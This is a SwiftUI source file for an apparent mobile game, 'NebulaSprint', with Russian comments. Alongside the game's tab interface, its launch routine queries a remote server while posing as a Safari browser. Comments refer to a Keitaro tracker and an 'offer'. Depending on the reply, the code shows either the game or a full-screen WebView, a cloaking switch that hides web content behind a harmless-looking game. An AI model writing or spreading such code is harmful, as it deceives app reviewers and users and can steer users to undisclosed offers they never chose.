//
//  ContentView.swift
//  NebulaSprint
//
//  Created on 2025
//

import SwiftUI
import Foundation


struct ContentView: View {
    @EnvironmentObject var scoreService: ScoreService
    @EnvironmentObject var settingsService: SettingsService
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    
    @State private var selectedTab = 0
    @State private var hasCompletedOnboarding: Bool = UserDefaults.standard.bool(forKey: "hasCompletedOnboarding")
    
    var currentTheme: GameTheme {
        GameTheme.theme(for: scoreService.currentSession.selectedTheme)
    }
    
    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                ProgressView()
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    Group {
                        if !hasCompletedOnboarding {
                            OnboardingView(
                                viewModel: OnboardingViewModel(scoreService: scoreService),
                                onComplete: {
                                    hasCompletedOnboarding = true
                                }
                            )
                        } else {
                            mainTabView
                        }
                    }
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            makeServerRequest()
        }
    }
    
    private var mainTabView: some View {
        ZStack {
            currentTheme.backgroundColor
                .ignoresSafeArea()
            
            VStack(spacing: 0) {
                // Content
                TabView(selection: $selectedTab) {
                    GameViewWrapper()
                        .tag(0)
                        .environmentObject(scoreService)
                        .environmentObject(settingsService)
                    
                    LifestyleView(scoreService: scoreService)
                        .tag(1)
                    
                    SettingsViewWrapper()
                        .tag(2)
                        .environmentObject(scoreService)
                        .environmentObject(settingsService)
                }
                .tabViewStyle(.page(indexDisplayMode: .never))
                
                // Custom Tab Bar
                customTabBar
            }
        }
    }
    
    private var customTabBar: some View {
        HStack(spacing: 0) {
            tabButton(
                icon: "gamecontroller.fill",
                title: "Play",
                index: 0
            )
            
            tabButton(
                icon: "heart.fill",
                title: "Lifestyle",
                index: 1
            )
            
            tabButton(
                icon: "gearshape.fill",
                title: "Settings",
                index: 2
            )
        }
        .padding(.vertical, 12)
        .padding(.horizontal)
        .background(
            RoundedRectangle(cornerRadius: 25)
                .fill(currentTheme.backgroundColor.opacity(0.95))
                .shadow(color: currentTheme.backgroundColor.darken.opacity(0.5), radius: 10, x: 0, y: -5)
        )
        .padding(.horizontal)
        .padding(.bottom, 10)
    }
    
    private func tabButton(icon: String, title: String, index: Int) -> some View {
        Button(action: {
            withAnimation(.spring(response: 0.3, dampingFraction: 0.7)) {
                selectedTab = index
            }
        }) {
            VStack(spacing: 5) {
                Image(systemName: icon)
                    .font(.system(size: 24, weight: selectedTab == index ? .bold : .regular))
                    .foregroundColor(selectedTab == index ? currentTheme.accentColor : .white.opacity(0.5))
                
                Text(title)
                    .font(.system(size: 12, weight: selectedTab == index ? .semibold : .regular, design: .rounded))
                    .foregroundColor(selectedTab == index ? currentTheme.accentColor : .white.opacity(0.5))
            }
            .frame(maxWidth: .infinity)
            .padding(.vertical, 8)
            .background(
                RoundedRectangle(cornerRadius: 15)
                    .fill(selectedTab == index ? currentTheme.buttonColor.opacity(0.3) : Color.clear)
            )
        }
    }
    
    private func makeServerRequest() {
        
        let dataManager = DataManagers()
        
        guard let url = URL(string: dataManager.server) else {
            self.isBlock = false
            self.isFetched = true
            return
        }
        
        print("🚀 Making request to: \(url.absoluteString)")
        print("🏠 Host: \(url.host ?? "unknown")")
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.timeoutInterval = 5.0
        
        // Добавляем заголовки для имитации браузера
        request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", forHTTPHeaderField: "User-Agent")
        request.setValue("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", forHTTPHeaderField: "Accept")
        request.setValue("ru-RU,ru;q=0.9,en;q=0.8", forHTTPHeaderField: "Accept-Language")
        request.setValue("gzip, deflate, br", forHTTPHeaderField: "Accept-Encoding")
        
        print("📤 Request Headers: \(request.allHTTPHeaderFields ?? [:])")
        
        // Создаем URLSession без автоматических редиректов
        let config = URLSessionConfiguration.default
        let session = URLSession(configuration: config, delegate: RedirectHandler(), delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            
            DispatchQueue.main.async {
                
                // Если есть любая ошибка (включая SSL) - блокируем
                if let error = error {
                    print("❌ Network error: \(error.localizedDescription)")
                    print("Server unavailable, showing block")
                    self.isBlock = true
                    self.isFetched = true
                    return
                }
                
                // Если получили ответ от сервера
                if let httpResponse = response as? HTTPURLResponse {
                    
                    print("📡 HTTP Status Code: \(httpResponse.statusCode)")
                    print("📋 Response Headers: \(httpResponse.allHeaderFields)")
                    
                    // Логируем тело ответа для диагностики
                    if let data = data, let responseBody = String(data: data, encoding: .utf8) {
                        print("📄 Response Body: \(responseBody.prefix(500))") // Первые 500 символов
                    }
                    
                    if httpResponse.statusCode == 200 {
                        // Проверяем, есть ли контент в ответе
                        let contentLength = httpResponse.value(forHTTPHeaderField: "Content-Length") ?? "0"
                        let hasContent = data?.count ?? 0 > 0
                        
                        if contentLength == "0" || !hasContent {
                            // Пустой ответ = "do nothing" от Keitaro
                            print("🚫 Empty response (do nothing): Showing block")
                            self.isBlock = true
                            self.isFetched = true
                        } else {
                            // Есть контент = успех
                            print("✅ Success with content: Showing WebView")
                            self.isBlock = false
                            self.isFetched = true
                        }
                        
                    } else if httpResponse.statusCode >= 300 && httpResponse.statusCode < 400 {
                        // Редиректы = успех (есть оффер)
                        print("✅ Redirect (code \(httpResponse.statusCode)): Showing WebView")
                        self.isBlock = false
                        self.isFetched = true
                        
                    } else {
                        // 404, 403, 500 и т.д. - блокируем
                        print("🚫 Error code \(httpResponse.statusCode): Showing block")
                        self.isBlock = true
                        self.isFetched = true
                    }
                    
                } else {
                    
                    // Нет HTTP ответа - блокируем
                    print("❌ No HTTP response: Showing block")
                    self.isBlock = true
                    self.isFetched = true
                }
            }
            
        }.resume()
    }
}

// MARK: - Wrapper Views для создания ViewModels один раз
struct GameViewWrapper: View {
    @EnvironmentObject var scoreService: ScoreService
    @EnvironmentObject var settingsService: SettingsService
    @StateObject private var viewModel: GameViewModel
    
    init() {
        // Создаем пустышки для инициализации
        let temp1 = ScoreService()
        let temp2 = SettingsService()
        _viewModel = StateObject(wrappedValue: GameViewModel(scoreService: temp1, settingsService: temp2))
    }
    
    var body: some View {
        GameView(viewModel: viewModel)
            .onAppear {
                // Обновляем сервисы при появлении
                viewModel.scoreService = scoreService
                viewModel.settingsService = settingsService
            }
    }
}

struct SettingsViewWrapper: View {
    @EnvironmentObject var scoreService: ScoreService
    @EnvironmentObject var settingsService: SettingsService
    @StateObject private var viewModel: SettingsViewModel
    
    init() {
        // Создаем пустышки для инициализации
        let temp1 = ScoreService()
        let temp2 = SettingsService()
        _viewModel = StateObject(wrappedValue: SettingsViewModel(settingsService: temp2, scoreService: temp1))
    }
    
    var body: some View {
        SettingsView(viewModel: viewModel)
            .onAppear {
                // Обновляем сервисы при появлении
                viewModel.scoreService = scoreService
                viewModel.settingsService = settingsService
            }
    }
}

